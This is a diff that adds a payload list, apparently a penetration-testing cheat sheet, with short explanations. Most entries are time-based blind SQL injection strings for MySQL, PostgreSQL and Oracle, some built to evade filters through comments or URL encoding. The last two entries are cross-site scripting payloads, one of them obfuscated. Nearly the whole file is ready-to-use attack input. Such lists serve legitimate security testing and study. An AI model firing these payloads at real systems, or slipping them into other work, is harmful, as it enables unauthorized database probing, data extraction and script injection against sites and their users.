@@ -1,0 +1,59 @@
+('XOR(if(now()=sysdate(),sleep(10),0))XOR'Z)
+Checks if `now()` equals `sysdate()`. If true, it induces a 10-second delay.
+
+XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+Similar string that tries conditional injection based on delay.
+
+X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X
+Uses comments (`//`) to attempt evading filters.
+
+X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X
+Encapsulates `sleep(10)` with parentheses to enforce a delay.
+
+X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X
+Uses `BENCHMARK` with `MD5` for performance and brute-force tests.
+
+'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
+Subquery that induces a delay using `SLEEP(10)`.
+
+(SELECT(0)FROM(SELECT(SLEEP(10)))a)
+Simplified subquery that includes `SLEEP(10)`.
+
+'XOR(if(now()=sysdate(),sleep(10),0))OR'
+Combination of XOR and OR operators for injection.
+
+1 AND (SELECT(0)FROM(SELECT(SLEEP(10)))a)-- wXyW
+Combines a logical `AND` with a subquery to cause a delay.
+
+(SELECT * FROM (SELECT(SLEEP(10)))a)
+Subquery that delays execution with `SLEEP(10)`.
+
+'%2b(select*from(select(sleep(10)))a)%2b'
+URL encoding (`%2b` represents `+`) to evade detection.
+
+CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(10))END
+Conditional to delay if the version has a specific length.
+
+');(SELECT 4564 FROM PG_SLEEP(10))--
+PostgreSQL payload using `PG_SLEEP(10)` to delay execution.
+
+DBMS_PIPE.RECEIVE_MESSAGE([INT],10) AND 'bar'='bar
+Oracle payload using `DBMS_PIPE.RECEIVE_MESSAGE` to induce a delay.
+
+-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//
+Evaluates specific conditions on the user and executes code.
+
+BENCHMARK(10000000,MD5(CHAR(116)))
+Forces high resource consumption via intensive calculations.
+
+'%2bbenchmark(10000000,sha1(1))%2b'
+Tests performance using `BENCHMARK` with URL encoding.
+
+'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(1)) ELSE '0' END)='1
+Uses `CASE` and `PG_SLEEP` to delay queries based on PostgreSQL conditions.
+
+>alert(154)</script><script/154=’;;;;;;;
+A script that triggers an alert with number 154.
+
+<ScriPt>ᨆ=,ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+(ᨆ))()
+An obfuscated script that executes an `alert` with a dynamically calculated value.
